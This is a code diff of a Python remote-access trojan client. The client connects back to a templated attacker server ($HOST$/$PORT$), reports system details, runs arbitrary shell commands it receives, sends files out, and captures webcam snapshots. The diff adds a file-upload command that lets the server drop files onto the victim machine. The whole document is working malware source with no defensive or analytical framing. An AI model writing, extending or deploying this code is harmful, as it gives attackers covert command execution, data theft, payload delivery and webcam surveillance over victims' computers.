@@ -2,7 +2,6 @@ import socket
 import subprocess
 import os
 import platform
-import time
 import cv2
 
 
@@ -36,6 +35,23 @@ def send_file(filename):
                 s.sendall(bytes_read)
 
 
+def recv_file(path):
+    filesize = int(s.recv(BUFFER_SIZE).decode())
+    s.send("ok".encode())
+    left = filesize
+    try:
+        f = open(path, "wb")
+        while 1:
+            rev = s.recv(BUFFER_SIZE)
+            f.write(rev)
+            left -= len(rev)
+            if left == 0:
+                break
+        f.close()
+    except FileNotFoundError:
+        s.send("No such file or directory".encode())
+
+
 def run():
     while True:
         # receive the command from the server
@@ -49,9 +65,15 @@ def run():
             else:
                 os.chdir(command[3:])
             s.send(os.getcwd().encode())
+        # File download
         elif command[:8] == "download":
             filename = command[9:]
             send_file(filename)
+        # File upload
+        elif command[:6] == "upload":
+            filename = command[7:]
+            recv_file(filename)
+        # Webcam Snapshot
         elif command[:11] == "webcam_snap":
             webcam_snap()
         else:
@@ -60,7 +82,6 @@ def run():
             output = p.stdout
             # send the results back to the server
             s.send(output + "\n".encode() + os.getcwd().encode())
-    # close client connection
     s.close()
 
 
@@ -68,15 +89,11 @@ if __name__ == '__main__':
     SERVER_HOST = "$HOST$"
     SERVER_PORT = "$PORT$"
     BUFFER_SIZE = 10240
-
-    # create the socket object
     s = socket.socket()
-    # connect to the server
     s.connect((SERVER_HOST, SERVER_PORT))
     # send platform message
     s.send(platform.platform().encode() + "\n".encode() + os.getcwd().encode())
     # acccept the chcp command
     cmd = s.recv(BUFFER_SIZE).decode()
     p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-    # Run the loop
     run()
